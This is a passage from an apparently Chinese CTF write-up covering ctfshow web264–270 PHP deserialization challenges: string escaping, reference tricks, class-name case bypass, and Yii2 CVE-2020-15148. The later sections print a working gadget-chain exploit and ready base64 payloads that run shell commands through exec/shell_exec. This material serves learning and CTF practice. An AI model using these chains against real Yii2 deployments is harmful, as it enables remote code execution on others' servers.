invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure><p>这里说一下操作步骤。</p><ol><li>先访问页面，获取到cookie和session。</li><li>运行exp，将反序列化字符放入cookie中limit</li><li>访问check.php</li><li>访问1.php<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>和上一个逃逸差别是在访问message.php时需要在cookie中添加msg的参数作为session，值并没有要求。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">2</span>&amp;t=<span class="number">3</span>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>然后再message.php传入一个cookie值为msg=1<br>以上是wp中所说的步骤，但是这里我无论如何执行都是<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690625827239-a0c8c2ad-a4e6-4578-a9d1-21a26204f743.png" alt="image.png"><br>即使重新写payload也是相同结果。<br>最后修改好了，是因为我开了两个页面，第一个页面传出的session我没有交给第二个页面<code>message.php</code>导致不能得到回显，使用一个页面修改就好了。<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h3 id="反序列化指针引用-amp"><a href="#反序列化指针引用-amp" class="headerlink" title="反序列化指针引用&amp;"></a>反序列化指针引用&amp;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());<span class="comment">//生成随机数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="引用传值"><a href="#引用传值" class="headerlink" title="引用传值"></a>引用传值</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">abc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">abc</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;a =&amp;<span class="variable">$c</span>-&gt;b;</span><br><span class="line"><span class="variable">$c</span>-&gt;a = <span class="string">&#x27;1&#x27;</span>;<span class="comment">//此时哪怕修改a的值也不管用</span></span><br><span class="line"><span class="variable">$c</span>-&gt;b = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$c</span>-&gt;a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">cc459dba9ce1830f72c80ba14532bbac</span><br></pre></td></tr></table></figure>exp：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password=&amp;<span class="variable">$a</span>-&gt;token;<span class="comment">//让passwd的值随token变</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">O:<span class="number">12</span>:<span class="string">&quot;ctfshowAdmin&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;i:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h3 id="php对类名大小写不敏感"><a href="#php对类名大小写不敏感" class="headerlink" title="php对类名大小写不敏感"></a>php对类名大小写不敏感</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>出现ctfshow就会抛出异常，就不能触发__destruct方法，因此使用大写就行。</li></ol><ul><li>区分大小写的： 变量名、常量名、数组索引（键名key）</li><li>不区分大小写的：函数名、方法名、类名、魔术常量、NULL、FALSE、TRUE</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;&#125;;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Ctfshow</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</span></span><br></pre></td></tr></table></figure><p>这里的的使用方法挺神奇：<br>在hackbar不知道为什么传不进去post请求体，用bp抓包就行了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690624961632-8d70a56c-bd65-4a35-87d1-0bb968ead848.png" alt="image.png"></p><h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><h3 id="CVE-2020-15148-Yii2反序列化漏洞"><a href="#CVE-2020-15148-Yii2反序列化漏洞" class="headerlink" title="CVE-2020-15148 Yii2反序列化漏洞"></a>CVE-2020-15148 Yii2反序列化漏洞</h3><p>后面一堆操作有点没看懂。一查发现是一个漏洞：</p><blockquote><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">https://blog.csdn.net/xuandao_ahfengren/article/details/111259943</a></p></blockquote><p>admin admin弱口令密码登录，在about页面查看源代码会发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?view-source --&gt;</span><br></pre></td></tr></table></figure><p>但是这里我一点击about就会退出admin状态。可能是某个地方出了问题，不重要。<br>访问：<code>/index.php?r=site%2Fabout&amp;view-source</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690626931485-6d460a9f-e967-42e5-9521-993e2781c164.png" alt="image.png"><br>提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接用网上的poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;<span class="comment">//PHP函数</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cat /flag &gt;2.txt&#x27;</span>;    <span class="comment">//PHP函数的参数  </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">IndexAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">BatchQueryResult</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><p>然后访问根目录下的2.txt即可</p><h1 id="web268-269"><a href="#web268-269" class="headerlink" title="web268-269"></a>web268-269</h1><h3 id="CVE-2020-15148-Yii2反序列化漏洞-1"><a href="#CVE-2020-15148-Yii2反序列化漏洞-1" class="headerlink" title="CVE-2020-15148 Yii2反序列化漏洞"></a>CVE-2020-15148 Yii2反序列化漏洞</h3><p>类似但是需要改改poc，因为有过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;); <span class="comment">//此处写命令</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=</span><br></pre></td></tr></table></figure><h1 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    